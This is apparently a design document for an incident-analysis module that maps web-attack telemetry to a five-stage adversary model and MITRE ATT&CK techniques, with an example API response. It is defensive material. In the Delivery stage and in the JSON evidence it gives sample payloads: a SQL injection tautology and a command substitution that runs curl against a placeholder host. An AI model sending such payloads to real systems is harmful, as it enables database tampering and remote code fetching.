# AutoHeal v3.0 — Phase 5: Attack Sequence Analysis & Adversary Modeling

## 1. Executive Summary

Understanding modern web attacks requires synthesizing isolated HTTP telemetry events into a coherent adversary campaign narrative. The **Attack Sequence Analysis** module of the AutoHeal v3.0 Incident Command Center maps security events against standard adversary progression models, distinguishes observed telemetry facts from analytical hypotheses, and links indicators directly to the **MITRE ATT&CK Enterprise Framework**.

---

## 2. Five-Stage Adversary Sequence Model

The engine structures all incident telemetry across five tactical phases:

```mermaid
graph LR
    Stage1[1. Reconnaissance] --> Stage2[2. Delivery]
    Stage2 --> Stage3[3. Exploitation]
    Stage3 --> Stage4[4. Escalation]
    Stage4 --> Stage5[5. Exfiltration / Impact]

    style Stage1 fill:#1e293b,stroke:#3b82f6,stroke-width:2px
    style Stage2 fill:#1e293b,stroke:#6366f1,stroke-width:2px
    style Stage3 fill:#1e293b,stroke:#f59e0b,stroke-width:2px
    style Stage4 fill:#1e293b,stroke:#ef4444,stroke-width:2px
    style Stage5 fill:#1e293b,stroke:#dc2626,stroke-width:2px
```



1. **Reconnaissance:** Enumeration of endpoints, probing of query parameters, fuzzing of HTTP headers, or credential stuffing discovery.
2. **Delivery:** Transmission of structured malicious payloads (e.g., `' OR '1'='1`, `$(curl malicious.site)`, nested JWT tokens) across targeted API routes.
3. **Exploitation:** Successful trigger of underlying software vulnerability (e.g., database query manipulation, deserialization breach, state confusion).
4. **Escalation / Lateral Motion:** Privilege escalation, role manipulation, secondary API pivoting, or bypass of rate-limiting controls.
5. **Exfiltration / Operational Impact:** Unauthorized data retrieval, database schema enumeration, unauthorized financial transactions, or resource exhaustion.

---

## 3. Epistemological Segregation: Observed Facts vs. Hypotheses

To avoid confirmation bias in forensic investigations, the user interface enforces a strict visual and semantic separation:

| Dimension | Observed Facts | Analytical Hypotheses |
| :--- | :--- | :--- |
| **Data Source** | Cryptographically hashed HTTP logs, SQLite query traces, raw status codes. | Correlation heuristics, ML anomaly scores, analyst deductions. |
| **Reliability** | 100% Deterministic (Verified by SHA-256). | Probabilistic (Requires SOC validation). |
| **Visual Styling** | Solid Emerald (`#10b981`) or Cyan (`#06b6d4`) badges labeled `OBSERVED FACT`. | Dashed Amber (`#f59e0b`) borders labeled `ANALYTICAL HYPOTHESIS`. |
| **Example** | `POST /api/auth/login returned HTTP 500 with SQL syntax error`. | `Attacker likely leveraging automated sqlmap tool with time-based blind injection profile`. |

---

## 4. MITRE ATT&CK Enterprise Mapping

Each analyzed incident is automatically attributed to relevant MITRE ATT&CK tactics and techniques:

```
+----------------------------------------------------------------------------------------------------+
|  MITRE ATT&CK Enterprise Mapping                                                                   |
+----------------------+--------------------+--------------------------------------------------------+
| Tactic               | Technique ID       | Technique Name & Context                               |
+----------------------+--------------------+--------------------------------------------------------+
| Initial Access       | T1190              | Exploit Public-Facing Application (ShopSphere API)      |
| Execution            | T1059.004          | Command & Scripting: Unix Shell (RCE Payload Injection)|
| Persistence          | T1505.003          | Server Software Component: Web Shell                   |
| Privilege Escalation | T1078.004          | Valid Accounts: Compromised Cloud Administrator        |
| Defense Evasion      | T1027              | Obfuscated/Encoded Payloads (Base64 / Hex URL Encoding)|
| Exfiltration         | T1041              | Exfiltration Over C2 Channel                           |
+----------------------+--------------------+--------------------------------------------------------+
```

---

## 5. API Endpoint Architecture

The frontend queries the dedicated attack sequence service:
- **Endpoint:** `GET /api/security/incidents/{incident_id}/attack-sequence`
- **Response Structure:**
  ```json
  {
    "incident_id": "INC-20261101-AUTH-001",
    "stages": [
      {
        "stage_number": 1,
        "stage_name": "Reconnaissance",
        "status": "COMPLETED",
        "description": "Port scanning and parameter discovery against /api/auth/login",
        "mitre_technique": "T1595 - Active Scanning",
        "is_fact": true,
        "evidence_snippet": "Rapid 404/400 responses from client IP"
      },
      {
        "stage_number": 2,
        "stage_name": "Delivery",
        "status": "DETECTED",
        "description": "SQL injection payloads delivered in username field",
        "mitre_technique": "T1190 - Exploit Public-Facing Application",
        "is_fact": true,
        "evidence_snippet": "' OR '1'='1' -- delivered via POST body"
      }
    ],
    "mitre_summary": ["T1595", "T1190", "T1059"]
  }
  ```
